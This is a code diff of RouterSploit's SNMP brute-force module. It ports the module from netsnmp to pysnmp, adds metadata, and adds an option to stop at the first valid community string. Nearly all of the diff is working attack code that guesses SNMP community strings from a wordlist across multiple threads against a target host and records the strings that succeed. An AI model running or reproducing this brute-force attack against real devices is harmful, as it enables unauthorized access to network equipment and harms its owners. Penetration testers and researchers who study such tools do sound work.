@@ -1,5 +1,5 @@
 import threading
-import netsnmp
+from pysnmp.entity.rfc3413.oneliner import cmdgen
 
 from routersploit import (
     exploits,
@@ -21,7 +21,17 @@ class Exploit(exploits.Exploit):
     """
     __info__ = {
         'name': 'SNMP Bruteforce',
-        'author': 'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
+        'description': 'Module performs bruteforce attack against SNMP service. '
+                       'If valid community string is found, it is displayed to the user.',
+        'authors': [
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
+        ],
+        'references': [
+            '',
+        ],
+        'devices': [
+            'Multi',
+        ],
     }
 
     target = exploits.Option('', 'Target IP address or file with target:port (file://)')
@@ -29,7 +39,7 @@ class Exploit(exploits.Exploit):
     threads = exploits.Option(8, 'Number of threads')
     snmp = exploits.Option(wordlists.snmp, 'Community string or file with community strings (file://)')
     verbosity = exploits.Option('yes', 'Display authentication attempts')
-
+    stop_on_success = exploits.Option('yes', 'Stop on first valid community string')
     strings = []
 
     def run(self):
@@ -59,23 +69,27 @@ class Exploit(exploits.Exploit):
     def target_function(self, running, data):
         module_verbosity = boolify(self.verbosity)
         name = threading.current_thread().name
-        address = "{}:{}".format(self.target, self.port)
 
         print_status(name, 'thread is starting...', verbose=module_verbosity)
 
+        cmdGen = cmdgen.CommandGenerator()
         while running.is_set():
             try:
                 string = data.next().strip()
 
-                bindvariable = netsnmp.Varbind(".1.3.6.1.2.1.1.1.0")
-                res = netsnmp.snmpget(bindvariable, Version=1, DestHost=address, Community=string)
+                errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
+                    cmdgen.CommunityData(string),
+                    cmdgen.UdpTransportTarget((self.target, int(self.port))),
+                    '1.3.6.1.2.1.1.1.0',
+                )
 
-                if res[0] is not None:
-                    running.clear()
+                if errorIndication or errorStatus:
+                    print_error("Target: {}:{} {}: Invalid community string - String: '{}'".format(self.target, self.port, name, string), verbose=module_verbosity)
+                else:
+                    if boolify(self.stop_on_success):
+                        running.clear()
                     print_success("Target: {}:{} {}: Valid community string found - String: '{}'".format(self.target, self.port, name, string), verbose=module_verbosity)
                     self.strings.append((self.target, self.port, string))
-                else:
-                    print_error("Target: {}:{} {}: Invalid community string - String: '{}'".format(self.target, self.port, name, string), verbose=module_verbosity)
 
             except StopIteration:
                 break
